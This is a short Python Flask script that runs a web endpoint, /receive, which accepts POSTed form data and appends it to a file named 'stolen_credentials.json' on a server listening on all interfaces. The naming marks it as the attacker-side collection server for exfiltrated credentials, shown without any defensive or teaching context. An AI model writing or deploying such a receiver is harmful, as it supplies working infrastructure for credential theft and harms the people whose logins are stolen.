from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.form['data']
    with open('stolen_credentials.json', 'a') as f:
        f.write(data + '\n')
    return 'Data received', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)